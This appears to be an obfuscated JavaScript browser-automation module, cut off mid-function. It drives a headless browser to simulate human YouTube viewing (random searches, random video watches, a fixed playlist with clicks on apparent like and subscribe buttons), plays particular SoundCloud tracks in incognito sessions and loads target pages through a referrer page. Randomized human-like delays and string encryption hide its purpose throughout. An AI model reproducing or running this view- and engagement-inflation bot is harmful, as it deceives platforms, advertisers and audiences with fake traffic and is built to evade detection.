function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0x268b + 0x33 * -0xb5 + 0x4a9a);
    let h = e[f];
    return h;
  }, d(b, c);
}
const X = d,
  W = b,
  V = c;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (-0xa8d + 0x1bd3 * -0x1 + -0x4b * -0x83))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](-0x3a7 + 0x4e6 + -0x13f), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(-0x85a4 + -0x4 * 0x119 + -0x2 * -0x7f9c + (-0x7087 + 0x105b * -0x2 + 0xcbd5) * random()) : await standardWaitForNetIdle(f), await wait(0x2474 + 0x25c * 0x3 + 0xc0 * -0x20 + (-0x53 * 0x9d + -0x63c + -0x3 * -0x2011) * random()), 0x2144 + 0xc6f * 0x1 + -0x2db2 * 0x1;
}
async function standardWaitForNetIdle(f) {
  return await wait(0x890 * 0x4 + 0x7d + -0xe5 * 0x11), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), -0xd20 + -0x1710 + 0x73d * 0x5;
}
async function randomWait() {
  return await wait(-0x1506 + -0x130e + 0x3b9c + (0x2122 * -0x1 + -0x136 * -0x9 + 0x14e2 * 0x2) * random()), 0x26a * -0x8 + 0xb3e + 0x813 * 0x1;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    const R = b;
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + R(0x8, 'jTwN') + 'core-image' + '--loaded'))['slice'](0x1faf + -0x893 + -0x171c, -0xf2a + 0x1f94 + -0x1063), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((-0x3703 * -0x5 + -0x1724e + 0x1499f) * getRandomInt(-0x20be + -0x1f1 + 0x1 * 0x22b1, -0x1 * -0x118c + -0x266 + -0xf21), h)), 0x1e86 + -0xb * -0x84 + 0x221 * -0x11;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = 0x2 * -0x49a + 0x208 + 0x2 * 0x396;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[0x24a2 + -0x637 * 0x2 + -0x1833]['split']('\x20');
    for (let k = 0x2 * -0x85a + 0x17a3 + 0x19 * -0x47; k < i['length']; k += -0x2f * -0xb3 + 0x259 + -0x2334)
      j += i[k] * h[i[k + (-0x335 * -0x7 + 0x5ce * 0x4 + 0x2 * -0x16d5)]];
    return j;
  });
}
async function anchorAndView(f) {
  const S = b;
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + S(0x6, '5F0X')), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](-0x1ce5 + -0x1f08 * 0x1 + 0x3bf3)['map'](l => Array['from'](l['children']))['flat'](-0x10ce + 0x1aaf + -0x9e0)['map'](l => l['childNodes'][0x1 * 0x725 + -0x1d9b + 0x1677]['childNodes'][0x17 * -0xb2 + -0x2327 * -0x1 + -0x1329]['childNodes'][0xdfd + -0xc0f + 0x1 * -0x1ed]['childNodes'][0x2 * 0xe87 + -0x9 * -0x151 + -0x28e7]['childNodes'][-0x18c9 + -0xe * -0x1 + 0x18bc]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(0x2 * 0x1333 + 0x2083 + -0x4301 * 0x1, 0x1250 + -0x1193 * 0x1 + 0x12cb)), await f['click']('#__hookedV' + 'idToWatch'), await wait(-0x5d90 + 0x3 * 0x1723 + -0x17 * -0x399);
  const h = await getMaxTime(f),
    i = Math['min']((0x18d5e + 0xff07 + 0x1a205 * -0x1) * getRandomInt(-0xabf + 0x10b5 + -0x5f4, 0x32c * 0xb + 0x1 * 0xffd + 0xcb7 * -0x4), h);
  return await wait(i), -0x22f0 + -0x2148 + -0x23 * -0x1f3;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][-0x1aea + -0x6 * 0x509 + 0x3920]['children'][-0x1a1e * 0x1 + -0x34 * -0x2 + 0x19b6 * 0x1]['children'][-0x231 * -0x2 + 0x18bb + -0x1d1d * 0x1]['children'][0x347 * 0x3 + -0xe23 + 0x44e]['children'][-0x10bf + 0x1 * -0x1f1b + 0x2fda]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), 0x231c + 0x6b * 0x1e + -0x2fa5;
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0x268b + 0x33 * -0xb5 + 0x4a9a);
    let h = e[f];
    if (b['NItjNA'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0x1446 + -0x1 * -0x22de + -0xe98, s, t, u = -0x12b5 + -0x1d5d * -0x1 + -0xaa8; t = n['charAt'](u++); ~t && (s = r % (-0xa8d + 0x1bd3 * -0x1 + -0x4e * -0x7e) ? s * (-0x3a7 + 0x4e6 + -0xff) + t : t, r++ % (-0x1646 + -0xb * 0x11 + -0x1 * -0x1705)) ? p += String['fromCharCode'](-0x2583 + 0xae7 * -0x1 + 0x3169 & s >> (-(0x2474 + 0x25c * 0x3 + 0x4d6 * -0x9) * r & -0x5 * 0x517 + -0x31e + -0xd * -0x233)) : 0x2144 + 0xc6f * 0x1 + -0x2db3 * 0x1) {
          t = o['indexOf'](t);
        }
        for (let v = 0x890 * 0x4 + 0x7d + -0x22bd * 0x1, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0xd20 + -0x1710 + 0x244 * 0x10))['slice'](-(-0x1506 + -0x130e + 0x2816));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0x2122 * -0x1 + -0x136 * -0x9 + 0x163c * 0x1,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x26a * -0x8 + 0xb3e + 0x812 * 0x1; u < 0x1faf + -0x893 + -0x161c; u++) {
          p[u] = u;
        }
        for (u = -0xf2a + 0x1f94 + -0x106a; u < -0xa3 * -0x24 + -0x1edc + 0x8f0; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0x20be + -0x1f1 + 0x7 * 0x519), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x1 * -0x118c + -0x266 + -0xf26, q = 0x1e86 + -0xb * -0x84 + 0xe2 * -0x29;
        for (let v = 0x2 * -0x49a + 0x208 + 0x2 * 0x396; v < n['length']; v++) {
          u = (u + (0x24a2 + -0x637 * 0x2 + -0x1833)) % (0x2 * -0x85a + 0x17a3 + 0x1f * -0x31), q = (q + p[u]) % (-0x2f * -0xb3 + 0x259 + -0x2236), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0x335 * -0x7 + 0x5ce * 0x4 + 0x1 * -0x2cab)]);
        }
        return t;
      };
      b['vEBTCb'] = m, c = arguments, b['NItjNA'] = !![];
    }
    const j = e[-0x1ce5 + -0x1f08 * 0x1 + 0x3bed],
      k = f + j,
      l = c[k];
    return !l ? (b['xpBHRG'] === undefined && (b['xpBHRG'] = !![]), h = b['vEBTCb'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
async function searchAndView(f) {
  const T = d;
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f[T(0xc)](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': -0x190e + -0x1cae * 0x1 + 0x362 * 0x10 + (-0x3 * -0x1ba + 0x22a9 + -0x27a5) * random()
  }), await wait(0x18bf + -0x2696 * 0x1 + 0xfcb + (0x4 * 0x8 + 0x1ae * 0xb + -0x61 * 0x2e) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][0x142d + 0x1 * -0x20d9 + -0xcae * -0x1]['childNodes'][-0x1b50 * 0x1 + 0x5 * -0x322 + 0x2afb]['childNodes'][0x21ae + 0xc * -0x25 + -0x1ff1]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][-0x74 * -0x14 + -0x1a * -0x89 + -0x16f5]['childNodes'][0x1dd5 * 0x1 + 0xf7f * -0x1 + -0xe56]['childNodes'][-0x4 * 0x1a + -0x19b1 * 0x1 + 0xa3 * 0x29]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](-0x16fa + -0xb3 * -0x1a + 0x1 * 0x4cd),
          r = 0x21c3 + -0x5 * 0x119 + -0x1c46;
        for (let u = 0x57 * -0x42 + -0x1f20 + 0x358e; u < q['length']; u += 0x13a5 + -0x4 * 0x4e3 + -0x17)
          r += q[u] * k[q[u + (0x2 * -0x175 + -0x1bd7 * 0x1 + 0x2 * 0xf61)]];
        return r;
      }(n);
  });
  await wait((-0x584a * 0x1 + 0xc * -0x92b + 0x246 * 0x71) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((-0x9401 + 0x77a9 + 0x106b8) * getRandomInt(0x3 * -0x9cd + -0xec + -0x1 * -0x1e54, -0x169c + -0x831 + -0x1ed7 * -0x1), h + (0x2 * 0x741 + -0x5 * 0x72d + 0x28e7));
  return await wait(i), -0x158e + 0x11a3 + -0x2 * -0x1f6;
}
async function keyWatch(f) {
  const U = b;
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), -0x1297 + -0x19f3 + -0x1 * -0x2c8a), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + U(0xa, 'ifc4') + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, 0x7b3 + -0x1915 + 0x1d1a + (0x1313 * 0x1 + 0x3 * -0x5e5 + -0x17 * -0x1c) * Math['random']());
    });
  }, 0x36 * 0xeb + -0x4f * -0x7 + 0x1863 * -0x1);
  await wait(0x710cc * 0x1 + 0x23 * -0xdc2 + -0x9b66);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((-0x1 * 0x11d05 + 0x1a54b + 0x621a) * getRandomInt(-0x3 * 0x6bb + 0x13ba + 0x7b, 0x4d5 + 0x7 * 0x593 + 0x1 * -0x2bc1)), clearInterval(h), -0x85 * 0x2a + 0x1 * -0x335 + 0x1908;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = -0x1 * 0xddd + 0x756 + 0x687;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return 0x4c4 + 0x204e + -0x2511;
    await randomWait();
  }
  return 0xecf + -0x23c3 * -0x1 + -0x3 * 0x10db;
}

function fetchRandomSC() {
  return Math['random']() <= -0x22b5 + -0xb1b * -0x2 + 0xc7f + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < 0x2 * -0x125b + 0x5 * 0x647 + -0x1d * -0x2f + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= 0x14e2 + 0x616 + -0x1af8 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = -0x1f01 + 0x44b + 0x1ab6;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(-0x672a + 0x4 * -0x2d34 + -0x41ae * -0x7 + getRandomInt(-0x70e2 + -0x3ee * -0x18 + 0x2695 * 0x2, -0x8ffe + -0x12 * -0x6bd + 0x8be4));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](0x7f9 * 0x1 + -0x23cf + 0x1bd7), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = 0x173 * -0xe + -0x10a5 + 0x9b * 0x3d;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](-0x1924 + -0x17 * 0x153 + -0x3799 * -0x1, 0x1 * 0xc81 + 0x18af + -0x24fe * 0x1)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, 0x204 * -0x5 + -0x21b * 0x4 + 0x1a50 + floor((0x5d * -0x13 + 0xfb2 + -0x4e3) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0xc712 * -0xca22 + 0x65f99200 + -0x83283664),
          -0x6d7408 + -0x54b645 * 0x1 + 0x2e060b * 0x7,
          -0xa56f + 0x1 * -0x3ed + 0x1295c,
          0x15 * -0xad + 0xf7e + -0xcd
        ], y = [
          -0x3d9 * -0x1 + -0x1063 + 0xca2,
          0x43a + 0xbd9 + 0x1 * -0x1003,
          0x1 * -0x255b + 0x360 + 0x2203,
          -0x5 * 0x1d6 + 0x1 * 0x22e8 + -0xcdd * 0x2
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(0x1edb + 0x22 * 0x103 + -0x4140)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = 0x1 * 0x1029 + -0xc6f * 0x1 + 0x3ba * -0x1; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(-0xe7b + 0x23a9 + -0x152e * 0x1) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[0x2015 + -0xa7 * -0x26 + 0x3 * -0x12f5] = A[-0x6 * -0x25f + -0x1ca * 0x11 + -0x14 * -0xd0] = A[0x1d09 + 0x2 * -0xef + -0x1 * 0x1b2a] = A[0x161b + -0x383 * 0x9 + 0x982] = A[-0x23 * 0x103 + 0xc2 + 0x22aa] = A[0xe49 + -0x6 * 0x223 + -0x173] = A[0x1 * -0x1b13 + -0x1bb8 + 0x36d0] = A[0xbab + 0x25cc + -0x3171] = A[0x4d2 + -0x3 * -0x67e + -0x1845] = A[-0x8e * 0xb + 0x1 * -0x2c5 + 0x8e7] = A[-0x27 * 0x36 + -0x784 * -0x1 + -0x1 * -0xbf] = A[-0x2 * -0xdf5 + -0xd5 * -0x11 + 0x1 * -0x2a05] = A[-0x6 * 0x2c7 + 0x1894 + 0x1 * -0x7df] = A[-0xf2b + -0x1 * -0xe1e + -0x119 * -0x1] = A[-0x1e49 * -0x1 + 0x728 + -0x2564] = A[-0x26f + -0x1719 + 0x83 * 0x32] = A[0x7b2 + -0x12ca + 0x23b * 0x5] = 0xb * -0x1 + 0xc37 + -0xc2c, this['blocks'] = A) : this['blocks'] = [
                0xaf3 + 0x5bc * -0x5 + 0x11b9,
                0x6c2 + 0x15cc + -0x1c8e,
                0x14fe * -0x1 + 0x1 * 0x1ddb + -0x8dd,
                0x1810 + 0xec3 * 0x1 + -0x26d3 * 0x1,
                0x1 * -0x1503 + 0x2435 + -0xf32,
                0x9ac + 0x1858 + 0x1c * -0x137,
                -0xc9f + -0x1c97 + 0x2936,
                0xdcb + 0x7 * -0x1e5 + -0x4 * 0x22,
                -0x2016 + -0x40 * -0x14 + 0x1b16,
                0x2342 * 0x1 + -0xbac + -0x2 * 0xbcb,
                -0x5 * -0x545 + -0x1 * 0x407 + -0x1652,
                0x2f * -0x31 + -0x1 * -0x479 + -0x243 * -0x2,
                -0x2e8 * 0x3 + -0x19c0 + 0x2278,
                0x2 * -0x58e + 0x25e0 + -0x1ac4,
                0x6d3 * -0x3 + -0x1f45 + -0xb3 * -0x4a,
                -0x1 * -0xdc4 + -0x82 + -0x2 * 0x6a1,
                -0xa44 + 0x1a3e + 0xa * -0x199
              ], this['h0'] = -0x1518711e * -0x3 + 0xc26303c6 + -0x9a67341f, this['h1'] = -0x9c77fd55 + -0x568b8c71 + 0x1e2d1354f, this['h2'] = -0x7d4b5b * 0x1b1 + -0x68a97c * 0x253 + 0x61b9 * 0x63885, this['h3'] = 0x86e05a0 + 0x2ac6d3 + 0x7998803, this['h4'] = -0x6 * -0x5779fbd + -0x246f3101 + 0xc7745483, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = -0x1 * -0x1681 + -0xaca * 0x2 + -0xed, this['finalized'] = this['hashed'] = 0x62c + -0x42 + -0x5ea, this['first'] = -0x1b97 + 0x2 * 0xe92 + -0x18c;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = -0x5f8 + -0x1a * -0x2 + 0x5c4, O = J['length'] || -0x17ef + 0x1009 + 0x3 * 0x2a2, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = -0xb46 + 0xe * 0x266 + -0x164e, P[0x4f * -0x7a + 0x2f * 0x9c + 0x902] = this['block'], P[-0x1be9 + -0x233d + 0x3f36] = P[-0x664 + 0xe04 + 0x79f * -0x1] = P[0x1c01 + -0x6 * -0x2cc + -0x2cc7] = P[-0x2f5 + 0x13cc + -0x10d4] = P[0xe6 * -0x29 + -0x1600 + 0x3ada] = P[0x3d * 0x93 + 0x177b + -0x3a7d] = P[-0x23 * 0x39 + -0x6d * -0x2b + -0xa7e] = P[-0x12 * -0x65 + -0x51a * -0x6 + -0x25af] = P[-0xd80 + 0x245b + -0x16d3] = P[-0xf9b + 0xdd8 + -0x4 * -0x73] = P[0x859 + -0x190 + -0xb * 0x9d] = P[-0x1103 * 0x1 + 0x135c + -0x24e] = P[-0x11e * -0xb + -0x18a0 + 0xa * 0x13d] = P[0xbf5 + 0x5 * -0x123 + 0x3 * -0x213] = P[-0x31 * 0xa + -0x1 * 0xf0e + 0x1 * 0x1106] = P[-0x492 + 0xf09 + -0xa68] = -0x322 * 0x1 + 0x1 * -0x21f8 + 0xc5e * 0x3), K) {
                    for (N = this['start']; M < O && N < -0x7dd + -0x1a + -0x1 * -0x837; ++M)
                      P[N >> -0x2708 + 0x547 * -0x4 + 0x3c26] |= J[M] << y[0x1e9d + 0xfbe + -0x2e58 & N++];
                  } else {
                    for (N = this['start']; M < O && N < 0xff9 + 0x230b + -0x32c4; ++M)
                      (L = J['charCodeAt'](M)) < 0x250d + 0x1ce8 + 0x4175 * -0x1 ? P[N >> 0x1 * -0x1bb9 + 0xc2f * 0x1 + -0x7c6 * -0x2] |= L << y[0x196 * -0x5 + -0x5 * 0x609 + -0x23e * -0x11 & N++] : L < -0x24a5 + -0x55c + 0x3201 * 0x1 ? (P[N >> -0xfa * 0x2 + -0x3 * -0xcb3 + 0x349 * -0xb] |= (0x2238 + 0xda * -0x14 + 0x1 * -0x1070 | L >> 0x114f + -0x1355 + 0x20c) << y[0x577 * -0x4 + 0x1b65 + -0x2c3 * 0x2 & N++], P[N >> -0x1cf1 + -0x1c09 + 0x38fc] |= (-0x9c * -0x9 + -0x1 * -0x2070 + -0x256c | -0x7e * -0x15 + 0x2525 + -0x2f3c & L) << y[0x2ad * -0xd + 0x13 * 0x10c + 0xee8 & N++]) : L < -0x183a8 + -0x1f * 0x7c2 + 0x34c26 || L >= 0xb * -0x841 + 0x1b1e5 + 0x1 * -0x771a ? (P[N >> 0x57 * 0x17 + 0x1c69 + -0x2438] |= (-0xcc2 * 0x1 + -0x1407 + 0x21a9 * 0x1 | L >> 0xe4 + -0x23f3 + -0x231b * -0x1) << y[0x21ae + -0x1684 + -0x23b * 0x5 & N++], P[N >> -0x1 * 0x1d6 + -0x5 * 0x629 + 0x20a5] |= (0x56 * -0x3b + -0x2 * 0x125d + -0x3 * -0x1304 | L >> 0x1 * -0x1cc1 + 0xc5 * -0x31 + 0x427c & -0x25b3 + 0xc * -0xff + 0x31e6) << y[-0x6 * 0x7a + 0x855 * -0x3 + 0x1bde & N++], P[N >> -0x1b24 + 0x655 + -0x14d1 * -0x1] |= (-0x45b + -0xe * 0x5b + 0x9d5 | 0x1522 * -0x1 + -0x1 * -0x1615 + -0x6 * 0x1e & L) << y[-0x14f7 + -0x2229 + 0x3723 & N++]) : (L = -0x7ca5 + -0x9 * -0x24d + 0x2 * 0xb3f8 + ((0x1e36 + -0x328 + -0x170f & L) << -0x39b + -0x3 * 0x7bd + 0x1adc | 0x9e0 * 0x3 + 0x2432 + -0x7 * 0x8d5 & J['charCodeAt'](++M)), P[N >> -0x607 + 0x1 * 0x1f18 + -0x1 * 0x190f] |= (0x5e0 + -0xc2f * 0x1 + 0x73f * 0x1 | L >> -0xaf * -0x37 + -0x4d2 + -0x20b5) << y[0x1 * -0x1c6e + 0x130c * -0x2 + 0x4289 * 0x1 & N++], P[N >> -0x1a0c * 0x1 + 0x5 * 0x66 + -0x4d0 * -0x5] |= (0x4e5 + -0x1 * -0x22de + -0x1 * 0x2743 | L >> 0x2e8 * 0xc + 0x1 * 0x103f + -0x3313 * 0x1 & -0x1 * -0x14b3 + 0x1 * 0x10b4 + -0x2528) << y[-0x246f + -0x179b + 0x3c0d * 0x1 & N++], P[N >> 0x1e4f * 0x1 + -0x1b31 * 0x1 + -0x31c] |= (0x7f4 + -0x57a + -0x1fa | L >> 0x20c + -0x1d0a + 0x1b04 & -0x2c5 * -0xa + -0x1 * -0x1c6 + -0x1d39) << y[-0x13cc + -0x81e + -0x94f * -0x3 & N++], P[N >> 0x1e05 + 0x9 * 0xcb + 0x3b7 * -0xa] |= (0x1e34 + 0xd6c + -0x2b20 | -0xb37 + 0x22 * -0xf1 + -0xade * -0x4 & L) << y[-0x1 * 0xa53 + -0x8 * -0x397 + -0x1262 * 0x1 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= -0x1b57 + -0xd7d + 0x148a * 0x2 ? (this['block'] = P[0x171e + -0xb2e + -0xa0 * 0x13], this['start'] = N - (-0xe64 + 0x6b2 + 0x7f2), this['hash'](), this['hashed'] = -0xf77 * 0x1 + -0xb23 * 0x3 + -0x3 * -0x104b) : this['start'] = N;
                }
                return this['bytes'] > 0x18646adc3 + 0x1ddee16e7 + -0x26434c4ab && (this['hBytes'] += this['bytes'] / (0x1 * -0x24ed428 + -0x1e194eb34 + -0x12e931e * -0x272) << -0x2595 + -0xad3 + 0xc1a * 0x4, this['bytes'] = this['bytes'] % (-0x3632384 + -0x9a30f874 + -0x4 * -0x676506fe)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = 0x6 * -0x2b4 + 0x9ed + 0x64c;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
